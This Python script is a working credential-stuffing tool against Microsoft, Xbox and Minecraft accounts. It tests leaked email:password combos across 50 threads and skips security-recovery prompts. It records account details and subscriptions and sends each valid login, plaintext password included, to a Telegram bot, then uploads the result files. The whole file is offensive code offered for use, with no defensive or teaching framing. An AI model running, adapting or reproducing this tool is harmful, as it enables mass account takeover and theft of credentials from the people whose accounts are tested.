import subprocess
import sys

try:
    import requests
    import urllib3
    import warnings
    from colorama import Fore, Style, init
    MODULES_INSTALLED = True
except ImportError:
    MODULES_INSTALLED = False

if not MODULES_INSTALLED:
    print("Installing required modules...")
    modules = ["requests", "colorama", "urllib3"]
    try:
        subprocess.check_call([sys.executable, "-m", "pip", "install"] + modules,
                            stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        print("✓ Modules installed! Please restart the script.\n")
        import time; time.sleep(2); sys.exit(0)
    except Exception as e:
        print(f"Error: {e}\nInstall manually: pip install {' '.join(modules)}")
        sys.exit(1)

import re
import time
import threading
import concurrent.futures
import os
from datetime import datetime
from urllib.parse import urlparse, parse_qs

init(autoreset=True)
urllib3.disable_warnings()
warnings.filterwarnings("ignore")

# ══════════════════════════════════════════════
WELCOME_VIDEO_URL = "https://t.me/QuatrHuit/2"
MY_SIGNATURE      = "@pypkg"
CHANNEL           = "https://t.me/QuatrHuit/"

SFTAG_URL = (
    "https://login.live.com/oauth20_authorize.srf"
    "?client_id=00000000402B5328"
    "&redirect_uri=https://login.live.com/oauth20_desktop.srf"
    "&scope=service::user.auth.xboxlive.com::MBI_SSL"
    "&display=touch&response_type=token&locale=en"
)

MAX_RETRIES     = 3
REQUEST_TIMEOUT = 10
THREAD_COUNT    = 50

BOT_TOKEN = ""
CHAT_ID   = ""

# ══════════════════════════════════════════════
BANNER = f"""
{Fore.CYAN} ██████╗██╗  ██╗███████╗ ██████╗██╗  ██╗███████╗██████╗ 
{Fore.CYAN}██╔════╝██║  ██║██╔════╝██╔════╝██║ ██╔╝██╔════╝██╔══██╗
{Fore.CYAN}██║     ███████║█████╗  ██║     █████╔╝ █████╗  ██████╔╝
{Fore.CYAN}██║     ██╔══██║██╔══╝  ██║     ██╔═██╗ ██╔══╝  ██╔══██╗
{Fore.CYAN}╚██████╗██║  ██║███████╗╚██████╗██║  ██╗███████╗██║  ██║
{Fore.CYAN} ╚═════╝╚═╝  ╚═╝╚══════╝ ╚═════╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝
{Fore.WHITE}{'─'*57}
{Fore.YELLOW}  DEVELOPED BY : {Fore.MAGENTA}{MY_SIGNATURE}
{Fore.YELLOW}  EXPIRES ON   : {Fore.RED}NEVER
{Fore.WHITE}{'─'*57}{Style.RESET_ALL}
"""

# ══════════════════════════════════════════════
class Stats:
    def __init__(self):
        self.checked      = 0
        self.hits         = 0
        self.bad          = 0
        self.twofa        = 0
        self.errors       = 0
        self.minecraft    = 0
        self.gamepass     = 0
        self.xbox         = 0
        self.not_linked   = 0
        self.retries      = 0
        self.current_email = ""
        self.start_time   = time.time()
        self._lock        = threading.Lock()

    def get_cpm(self):
        elapsed = time.time() - self.start_time
        return int((self.checked / elapsed) * 60) if elapsed > 0 else 0

stats = Stats()

# ══════════════════════════════════════════════
# FOLDERS
def create_folders():
    f = {
        "minecraft":  "Results/Minecraft",
        "gamepass":   "Results/GamePass",
        "xbox":       "Results/Xbox",
        "not_linked": "Results/HitNotLinked",
        "twofa":      "Results/2FA",
    }
    for path in f.values():
        os.makedirs(path, exist_ok=True)
    return f

folders = create_folders()

FILE_MAP = {
    "minecraft":  "Results/Minecraft/Minecraft-hits_by_@pyabrodies.txt",
    "gamepass":   "Results/GamePass/game_pass-hits_by_@pyabrodies.txt",
    "xbox":       "Results/Xbox/xbox-hits_by_@pyabrodies.txt",
    "not_linked": "Results/HitNotLinked/not_linked_by_@pyabrodies.txt",
    "twofa":      "Results/2FA/2fa_by_@pyabrodies.txt",
}

def save_hit(category, content):
    path = FILE_MAP.get(category)
    if path:
        try:
            with open(path, 'a', encoding='utf-8') as f:
                f.write(content + '\n')
        except:
            pass

# ══════════════════════════════════════════════
# TELEGRAM
class TelegramBot:
    def __init__(self, token, chat_id):
        self.token    = token
        self.chat_id  = chat_id
        self.base_url = f"https://api.telegram.org/bot{token}"

    def send_message(self, text):
        try:
            requests.post(
                f"{self.base_url}/sendMessage",
                data={"chat_id": self.chat_id, "text": text, "parse_mode": "HTML"},
                timeout=30
            )
        except:
            pass

    def send_video(self, video_url, caption=""):
        try:
            resp = requests.post(
                f"{self.base_url}/sendVideo",
                data={
                    "chat_id":    self.chat_id,
                    "video":      video_url,
                    "caption":    caption,
                    "parse_mode": "HTML"
                },
                timeout=60
            )
            return resp.status_code == 200
        except:
            return False

    def send_document(self, file_path, caption=""):
        try:
            if not os.path.exists(file_path) or os.path.getsize(file_path) == 0:
                return False
            with open(file_path, 'rb') as f:
                requests.post(
                    f"{self.base_url}/sendDocument",
                    files={"document": f},
                    data={"chat_id": self.chat_id, "caption": caption},
                    timeout=60
                )
            return True
        except:
            return False

bot: TelegramBot = None  # set in main

def tg_send_welcome():
    caption = (
        "🎮 <b>Xbox / Minecraft Checker</b>\n\n"
        "🔍 <b>About this tool:</b>\n"
        "• Checks Microsoft accounts for Xbox & Minecraft\n"
        "• Detects: Minecraft Java, Game Pass, Xbox Ultimate\n"
        "• Full Capture: Name, UUID, Capes, Subscriptions\n"
        "• Auto-saves results by category\n"
        "• Sends hits directly to Telegram\n\n"
        "⚡ <b>Proxyless | Multi-threaded | Full Capture</b>\n\n"
        f"📢 Channel: {CHANNEL}\n"
        f"👤 Credits: {MY_SIGNATURE}"
    )
    return bot.send_video(WELCOME_VIDEO_URL, caption)

def tg_send_hit(email, password, account_type,
                gamertag, name, uuid, capes, subscriptions,
                tier="N/A", rep="N/A", gamerpic=""):
    emoji_map = {
        "Xbox Game Pass Ultimate": "👑",
        "Xbox Game Pass":          "🎮",
        "Minecraft":               "⛏",
        "Xbox":                    "🕹",
        "Not Linked":              "🔓",
    }
    emoji = "✅"
    for key, val in emoji_map.items():
        if key in account_type:
            emoji = val
            break

    msg = (
        f"{emoji} <b>HIT FOUND!</b>\n"
        f"━━━━━━━━━━━━━━━━━━━━\n"
        f"📧 <b>Email:</b> <code>{email}</code>\n"
        f"🔑 <b>Password:</b> <code>{password}</code>\n"
        f"━━━━━━━━━━━━━━━━━━━━\n"
        f"🎮 <b>Gamertag:</b> {gamertag}\n"
        f"🏅 <b>Tier:</b> {tier}\n"
        f"⭐ <b>Reputation:</b> {rep}\n"
        f"━━━━━━━━━━━━━━━━━━━━\n"
        f"⛏ <b>MC Name:</b> {name}\n"
        f"🆔 <b>UUID:</b> <code>{uuid}</code>\n"
        f"🎭 <b>Capes:</b> {capes}\n"
        f"━━━━━━━━━━━━━━━━━━━━\n"
        f"🏷 <b>Type:</b> {account_type}\n"
        f"🎫 <b>Subscriptions:</b> {subscriptions}\n"
        f"━━━━━━━━━━━━━━━━━━━━\n"
        f"📢 @HoTmIlToOLs | 👤 @pyabrodies"
    )

    # إذا عندنا صورة، نرسل الصورة مع الكابشن
    if gamerpic and gamerpic != "N/A" and gamerpic.startswith("http"):
        try:
            resp = requests.post(
                f"https://api.telegram.org/bot{BOT_TOKEN}/sendPhoto",
                data={
                    "chat_id":    CHAT_ID,
                    "photo":      gamerpic,
                    "caption":    msg,
                    "parse_mode": "HTML"
                },
                timeout=30
            )
            if resp.status_code == 200:
                return
        except:
            pass
    # fallback: رسالة نصية
    bot.send_message(msg)

def tg_send_final():
    msg = (
        f"✅ <b>Checking Complete!</b>\n"
        f"━━━━━━━━━━━━━━━━━━━━\n"
        f"📊 <b>Checked:</b> {stats.checked}\n"
        f"✅ <b>Hits:</b> {stats.hits}\n"
        f"❌ <b>Bad:</b> {stats.bad}\n"
        f"🔒 <b>2FA:</b> {stats.twofa}\n"
        f"⚠️ <b>Errors:</b> {stats.errors}\n"
        f"━━━━━━━━━━━━━━━━━━━━\n"
        f"⛏ <b>Minecraft:</b> {stats.minecraft}\n"
        f"🎮 <b>Game Pass:</b> {stats.gamepass}\n"
        f"🕹 <b>Xbox:</b> {stats.xbox}\n"
        f"🔓 <b>Not Linked:</b> {stats.not_linked}\n"
        f"━━━━━━━━━━━━━━━━━━━━\n"
        f"⚡ <b>CPM:</b> {stats.get_cpm()}\n"
        f"📢 @HoTmIlToOLs | 👤 @pyabrodies"
    )
    bot.send_message(msg)

def tg_send_files():
    for cat, path in FILE_MAP.items():
        bot.send_document(path, f"📁 {os.path.basename(path)} | @pyabrodies")
        time.sleep(0.5)

# ══════════════════════════════════════════════
# LIVE TABLE DISPLAY  (matching the screenshot style)
def print_table(total):
    os.system('cls' if os.name == 'nt' else 'clear')
    print(BANNER)

    W = 50  # table inner width

    def row(label, value, color=Fore.WHITE):
        val_str = str(value)
        pad = W - len(label) - len(val_str) - 4
        print(f"{Fore.WHITE}│ {color}{label}{Fore.WHITE} │ {color}{val_str}{' '*pad}{Fore.WHITE}│{Style.RESET_ALL}")

    def separator():
        print(f"{Fore.WHITE}├{'─'*W}┤{Style.RESET_ALL}")

    def divider(label=""):
        inner = f"  {label}  " if label else ""
        left  = (W - len(inner)) // 2
        right = W - len(inner) - left
        print(f"{Fore.WHITE}│{' '*left}{Fore.CYAN}{inner}{Fore.WHITE}{' '*right}│{Style.RESET_ALL}")

    # Top border
    print(f"{Fore.WHITE}┌{'─'*W}┐{Style.RESET_ALL}")
    print(f"{Fore.WHITE}│ {Fore.YELLOW}Status checking...{' '*(W-19)}{Fore.WHITE}│{Style.RESET_ALL}")
    separator()

    # Stats
    row(f"✓ True ", stats.hits,   Fore.GREEN)
    row(f"✗ Bad  ", stats.bad,    Fore.RED)
    row(f"🔒 2FA ", stats.twofa,  Fore.YELLOW)
    row(f"↺ Retry", stats.retries,Fore.MAGENTA)

    separator()
    print(f"{Fore.WHITE}│ {Fore.CYAN}{'#'}{' '*(W-2)}{Fore.WHITE}│{Style.RESET_ALL}")
    separator()

    # Categories
    row(f"⛏  Minecraft  ", stats.minecraft,  Fore.GREEN)
    row(f"🎮  Game Pass  ", stats.gamepass,   Fore.CYAN)
    row(f"🕹  Xbox       ", stats.xbox,       Fore.BLUE)
    row(f"🔓  Not Linked ", stats.not_linked, Fore.YELLOW)

    separator()

    # Progress
    pct      = (stats.checked / total * 100) if total > 0 else 0
    prog_str = f"Progress: {pct:.1f}% | {stats.checked}/{total} | {stats.get_cpm()} CPM"
    pad      = W - len(prog_str) - 2
    print(f"{Fore.WHITE}│ {Fore.CYAN}{prog_str}{' '*pad}{Fore.WHITE}│{Style.RESET_ALL}")

    separator()

    # Current email
    email_display = stats.current_email[:W-12] if len(stats.current_email) > W-12 else stats.current_email
    pad           = W - len(email_display) - 11
    print(f"{Fore.WHITE}│ {Fore.YELLOW}Checking: {Fore.WHITE}{email_display}{' '*pad}{Fore.WHITE}│{Style.RESET_ALL}")

    print(f"{Fore.WHITE}└{'─'*W}┘{Style.RESET_ALL}")

# ══════════════════════════════════════════════
# AUTH FUNCTIONS
def get_sftag(session, max_attempts=MAX_RETRIES):
    for attempt in range(max_attempts):
        try:
            response = session.get(SFTAG_URL, timeout=REQUEST_TIMEOUT)
            text     = response.text
            match    = re.search(r'value=\\\"(.+?)\\\"', text, re.S) or re.search(r'value="(.+?)"', text, re.S)
            if match:
                sftag = match.group(1)
                match = re.search(r'"urlPost":"(.+?)"', text, re.S) or re.search(r"urlPost:'(.+?)'", text, re.S)
                if match:
                    return match.group(1), sftag
        except:
            pass
        time.sleep(0.5)
    return None, None

def microsoft_auth(session, email, password, url_post, sftag, max_attempts=MAX_RETRIES):
    for attempt in range(max_attempts):
        try:
            data         = {'login': email, 'loginfmt': email, 'passwd': password, 'PPFT': sftag}
            login_request = session.post(
                url_post, data=data,
                headers={'Content-Type': 'application/x-www-form-urlencoded'},
                allow_redirects=True, timeout=REQUEST_TIMEOUT
            )
            if '#' in login_request.url and login_request.url != SFTAG_URL:
                token = parse_qs(urlparse(login_request.url).fragment).get('access_token', ["None"])[0]
                if token != "None":
                    return token, "success"
            elif 'cancel?mkt=' in login_request.text:
                try:
                    d = {
                        'ipt':   re.search('(?<=\"ipt\" value=\").+?(?=\">)', login_request.text).group(),
                        'pprid': re.search('(?<=\"pprid\" value=\").+?(?=\">)', login_request.text).group(),
                        'uaid':  re.search('(?<=\"uaid\" value=\").+?(?=\">)', login_request.text).group()
                    }
                    action_url = re.search('(?<=id=\"fmHF\" action=\").+?(?=\" )', login_request.text).group()
                    ret        = session.post(action_url, data=d, allow_redirects=True, timeout=REQUEST_TIMEOUT)
                    return_url = re.search('(?<=\"recoveryCancel\":{\"returnUrl\":\").+?(?=\",)', ret.text).group()
                    fin        = session.get(return_url, allow_redirects=True, timeout=REQUEST_TIMEOUT)
                    token      = parse_qs(urlparse(fin.url).fragment).get('access_token', ["None"])[0]
                    if token != "None":
                        return token, "success"
                except:
                    pass
            elif any(v in login_request.text for v in ["recover?mkt", "account.live.com/identity/confirm?mkt", "Email/Confirm?mkt", "/Abuse?mkt="]):
                return None, "2fa"
            elif any(v in login_request.text.lower() for v in ["password is incorrect", "account doesn't exist", "sign in to your microsoft account", "tried to sign in too many times"]):
                return None, "bad"
        except:
            with stats._lock: stats.retries += 1
            if attempt == max_attempts - 1:
                return None, "error"
        time.sleep(0.5)
    return None, "error"

def get_xbox_token(session, ms_token, max_attempts=MAX_RETRIES):
    for attempt in range(max_attempts):
        try:
            payload  = {
                "Properties": {"AuthMethod": "RPS", "SiteName": "user.auth.xboxlive.com", "RpsTicket": ms_token},
                "RelyingParty": "http://auth.xboxlive.com", "TokenType": "JWT"
            }
            response = session.post(
                'https://user.auth.xboxlive.com/user/authenticate',
                json=payload,
                headers={'Content-Type': 'application/json', 'Accept': 'application/json'},
                timeout=REQUEST_TIMEOUT
            )
            if response.status_code == 200:
                data       = response.json()
                xbox_token = data.get('Token')
                if xbox_token:
                    return xbox_token, data['DisplayClaims']['xui'][0]['uhs']
            elif response.status_code == 429:
                time.sleep(2); continue
        except:
            with stats._lock: stats.retries += 1
            if attempt == max_attempts - 1: return None, None
        time.sleep(0.5)
    return None, None

def get_xsts_token(session, xbox_token, max_attempts=MAX_RETRIES):
    for attempt in range(max_attempts):
        try:
            payload  = {
                "Properties": {"SandboxId": "RETAIL", "UserTokens": [xbox_token]},
                "RelyingParty": "rp://api.minecraftservices.com/", "TokenType": "JWT"
            }
            response = session.post(
                'https://xsts.auth.xboxlive.com/xsts/authorize',
                json=payload,
                headers={'Content-Type': 'application/json', 'Accept': 'application/json'},
                timeout=REQUEST_TIMEOUT
            )
            if response.status_code == 200: return response.json().get('Token')
            elif response.status_code == 429: time.sleep(2); continue
        except:
            with stats._lock: stats.retries += 1
            if attempt == max_attempts - 1: return None
        time.sleep(0.5)
    return None

def get_minecraft_token(session, uhs, xsts_token, max_attempts=MAX_RETRIES):
    for attempt in range(max_attempts):
        try:
            response = session.post(
                'https://api.minecraftservices.com/authentication/login_with_xbox',
                json={'identityToken': f"XBL3.0 x={uhs};{xsts_token}"},
                headers={'Content-Type': 'application/json'},
                timeout=REQUEST_TIMEOUT
            )
            if response.status_code == 200: return response.json().get('access_token')
            elif response.status_code == 429: time.sleep(2); continue
        except:
            with stats._lock: stats.retries += 1
            if attempt == max_attempts - 1: return None
        time.sleep(0.5)
    return None

def check_entitlements(session, mc_token, max_attempts=MAX_RETRIES):
    for attempt in range(max_attempts):
        try:
            response = session.get(
                'https://api.minecraftservices.com/entitlements/mcstore',
                headers={'Authorization': f'Bearer {mc_token}'},
                timeout=REQUEST_TIMEOUT
            )
            if response.status_code == 200:
                text = response.text
                if 'product_game_pass_ultimate' in text:
                    return 'Xbox Game Pass Ultimate', ["Xbox Game Pass Ultimate"]
                elif 'product_game_pass_pc' in text:
                    return 'Xbox Game Pass', ["Xbox Game Pass"]
                elif '"product_minecraft"' in text:
                    return 'Minecraft', ["Minecraft Java"]
                else:
                    others = []
                    if 'product_minecraft_bedrock' in text: others.append("Bedrock")
                    if 'product_legends' in text:           others.append("Legends")
                    if 'product_dungeons' in text:          others.append("Dungeons")
                    if others: return 'Xbox: ' + ', '.join(others), others
                    return None, []
            elif response.status_code == 429:
                time.sleep(2); continue
            else:
                return None, []
        except:
            with stats._lock: stats.retries += 1
            if attempt == max_attempts - 1: return None, []
        time.sleep(0.5)
    return None, []

def get_profile(session, mc_token, max_attempts=MAX_RETRIES):
    for attempt in range(max_attempts):
        try:
            response = session.get(
                'https://api.minecraftservices.com/minecraft/profile',
                headers={'Authorization': f'Bearer {mc_token}'},
                timeout=REQUEST_TIMEOUT
            )
            if response.status_code == 200:   return response.json()
            elif response.status_code == 404: return None
            elif response.status_code == 429: time.sleep(2); continue
        except:
            with stats._lock: stats.retries += 1
            if attempt == max_attempts - 1: return None
        time.sleep(0.5)
    return None

# ══════════════════════════════════════════════
# XBOX PROFILE API
def get_xbox_profile(session, uhs, xsts_token, max_attempts=MAX_RETRIES):
    """Get Xbox Gamertag, Gamerpic, Tier using XSTS token"""
    for attempt in range(max_attempts):
        try:
            auth_header = f"XBL3.0 x={uhs};{xsts_token}"
            response = session.get(
                "https://profile.xboxlive.com/users/me/profile/settings"
                "?settings=Gamertag,GameDisplayPicRaw,AccountTier,XboxOneRep",
                headers={
                    "Authorization": auth_header,
                    "x-xbl-contract-version": "2",
                    "Accept": "application/json",
                    "Accept-Language": "en-US",
                },
                timeout=REQUEST_TIMEOUT
            )
            if response.status_code == 200:
                data     = response.json()
                settings = {
                    s["id"]: s.get("value", "N/A")
                    for s in data.get("profileUsers", [{}])[0].get("settings", [])
                }
                return {
                    "gamertag": settings.get("Gamertag",          "N/A"),
                    "gamerpic": settings.get("GameDisplayPicRaw", ""),
                    "tier":     settings.get("AccountTier",       "N/A"),
                    "rep":      settings.get("XboxOneRep",        "N/A"),
                }
            elif response.status_code == 429:
                time.sleep(2); continue
        except:
            pass
        time.sleep(0.3)
    return {"gamertag": "N/A", "gamerpic": "", "tier": "N/A", "rep": "N/A"}

# ══════════════════════════════════════════════
# MAIN CHECK
def check_account(combo):
    try:
        parts = combo.strip().split(':')
        if len(parts) < 2:
            with stats._lock: stats.bad += 1; stats.checked += 1
            return

        email    = parts[0]
        password = ':'.join(parts[1:])
        with stats._lock: stats.current_email = email

        session        = requests.Session()
        session.verify = False

        url_post, sftag = get_sftag(session)
        if not url_post or not sftag:
            with stats._lock: stats.errors += 1; stats.checked += 1
            return

        ms_token, auth_status = microsoft_auth(session, email, password, url_post, sftag)

        if auth_status == "2fa":
            with stats._lock: stats.twofa += 1; stats.checked += 1
            save_hit("twofa", f"{email}:{password}")
            return
        elif auth_status == "bad":
            with stats._lock: stats.bad += 1; stats.checked += 1
            return
        elif auth_status != "success" or not ms_token:
            with stats._lock: stats.errors += 1; stats.checked += 1
            return

        xbox_token, uhs = get_xbox_token(session, ms_token)
        if not xbox_token or not uhs:
            with stats._lock: stats.bad += 1; stats.checked += 1
            return

        xsts_token = get_xsts_token(session, xbox_token)
        if not xsts_token:
            with stats._lock: stats.bad += 1; stats.checked += 1
            return

        # ── Xbox Profile (Gamertag + Gamerpic) ──
        xbox_profile = get_xbox_profile(session, uhs, xsts_token)
        gamertag     = xbox_profile.get("gamertag", "N/A")
        gamerpic     = xbox_profile.get("gamerpic", "")
        tier         = xbox_profile.get("tier",     "N/A")
        rep          = xbox_profile.get("rep",      "N/A")

        mc_token = get_minecraft_token(session, uhs, xsts_token)
        if not mc_token:
            with stats._lock: stats.bad += 1; stats.checked += 1
            return

        account_type, subs = check_entitlements(session, mc_token)

        if not account_type:
            # Valid Xbox login but no game — Not Linked
            with stats._lock:
                stats.not_linked += 1; stats.hits += 1; stats.checked += 1
            capture = (
                f"Email         : {email}\n"
                f"Password      : {password}\n"
                f"Gamertag      : {gamertag}\n"
                f"Tier          : {tier}\n"
                f"Reputation    : {rep}\n"
                f"Type          : Xbox (Not Linked)\n"
                f"By @pyabrodies\n"
                f"{'='*50}"
            )
            save_hit("not_linked", capture)
            threading.Thread(
                target=tg_send_hit,
                args=(email, password, "Not Linked", gamertag, "N/A", "N/A", "None", tier, rep, gamerpic),
                daemon=True
            ).start()
            return

        profile = get_profile(session, mc_token)
        name    = profile.get('name', 'N/A')     if profile else "Not Set"
        uuid    = profile.get('id', 'N/A')       if profile else "N/A"
        capes   = ", ".join([c["alias"] for c in profile.get("capes", [])]) if profile else "None"
        if not capes: capes = "None"

        subs_str = ", ".join(subs) if subs else "None"

        capture = (
            f"Email         : {email}\n"
            f"Password      : {password}\n"
            f"Gamertag      : {gamertag}\n"
            f"Tier          : {tier}\n"
            f"Reputation    : {rep}\n"
            f"MC Name       : {name}\n"
            f"UUID          : {uuid}\n"
            f"Capes         : {capes}\n"
            f"Type          : {account_type}\n"
            f"Subscriptions : {subs_str}\n"
            f"By @pyabrodies\n"
            f"{'='*50}"
        )

        if 'Ultimate' in account_type or 'Game Pass' in account_type:
            with stats._lock: stats.gamepass += 1
            save_hit("gamepass", capture)
        elif 'Minecraft' in account_type:
            with stats._lock: stats.minecraft += 1
            save_hit("minecraft", capture)
        else:
            with stats._lock: stats.xbox += 1
            save_hit("xbox", capture)

        with stats._lock:
            stats.hits += 1; stats.checked += 1

        threading.Thread(
            target=tg_send_hit,
            args=(email, password, account_type, gamertag, name, uuid, capes, subs_str, tier, rep, gamerpic),
            daemon=True
        ).start()

    except Exception:
        with stats._lock: stats.errors += 1; stats.checked += 1

# ══════════════════════════════════════════════
def main():
    global BOT_TOKEN, CHAT_ID, bot

    print(BANNER)

    CHAT_ID   = input(f"{Fore.CYAN}  Enter your Telegram ID  : {Style.RESET_ALL}").strip()
    BOT_TOKEN = input(f"{Fore.CYAN}  Enter your Bot Token    : {Style.RESET_ALL}").strip()
    combo_file = input(f"{Fore.CYAN}  Enter combo file path   : {Style.RESET_ALL}").strip()
    print()

    if not os.path.exists(combo_file):
        print(f"{Fore.RED}  ✗ File not found: {combo_file}{Style.RESET_ALL}")
        return

    with open(combo_file, 'r', encoding='utf-8', errors='ignore') as f:
        combos = [line.strip() for line in f if line.strip() and ':' in line]

    total = len(combos)
    if total == 0:
        print(f"{Fore.RED}  ✗ No valid combos found!{Style.RESET_ALL}")
        return

    bot = TelegramBot(BOT_TOKEN, CHAT_ID)

    print(f"{Fore.GREEN}  ✓ Loaded {total} combos{Style.RESET_ALL}")
    print(f"{Fore.CYAN}  ✓ Threads : {THREAD_COUNT}{Style.RESET_ALL}")
    print(f"{Fore.CYAN}  ✓ Results → ./Results/{Style.RESET_ALL}\n")

    # Send welcome video
    print(f"{Fore.YELLOW}  → Sending welcome video to Telegram...{Style.RESET_ALL}")
    if tg_send_welcome():
        print(f"{Fore.GREEN}  ✓ Welcome video sent!{Style.RESET_ALL}\n")
    else:
        print(f"{Fore.YELLOW}  ⚠ Could not send video{Style.RESET_ALL}\n")

    input(f"{Fore.GREEN}  Press ENTER to start checking...{Style.RESET_ALL}")

    # Display thread
    stop_event = threading.Event()
    def display_loop():
        while not stop_event.is_set():
            print_table(total)
            time.sleep(0.4)

    disp = threading.Thread(target=display_loop, daemon=True)
    disp.start()

    # Checker
    with concurrent.futures.ThreadPoolExecutor(max_workers=THREAD_COUNT) as executor:
        futures = {executor.submit(check_account, c): c for c in combos}
        for f in concurrent.futures.as_completed(futures):
            pass

    stop_event.set()
    disp.join(timeout=1)

    # Final print
    print_table(total)
    print(f"\n{Fore.GREEN}  ✓ Checking complete!{Style.RESET_ALL}\n")

    # Telegram final
    print(f"{Fore.YELLOW}  → Sending final stats...{Style.RESET_ALL}")
    tg_send_final()

    print(f"{Fore.YELLOW}  → Sending result files...{Style.RESET_ALL}")
    tg_send_files()
    print(f"{Fore.GREEN}  ✓ Done! Check your Telegram.{Style.RESET_ALL}\n")

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(f"\n{Fore.RED}  ✗ Stopped by user{Style.RESET_ALL}")
    except Exception as e:
        print(f"\n{Fore.RED}  ✗ Fatal error: {e}{Style.RESET_ALL}")
